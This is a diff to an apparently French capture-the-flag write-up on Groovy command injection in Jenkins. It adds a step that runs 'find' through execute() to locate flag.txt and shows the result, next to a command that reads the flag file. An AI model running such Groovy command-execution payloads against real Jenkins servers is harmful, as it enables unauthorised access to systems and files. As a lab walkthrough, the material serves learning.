@@ -18,6 +18,12 @@ println("${cmd.text}");
 
 On constate que l'injection marche à merveille. En se mettant à la recherche du ```flag```, on fini par retrouver le répertoire dans lequel il se trouve.
 ```
+def cmd = "find . -name flag.txt".execute();
+println("${cmd.text}");
+```
+> ./var/jenkins_home/flag.txt
+
+```
 def cmd = "cat /var/jenkins_home/flag.txt".execute();
 println("${cmd.text}");
 ```
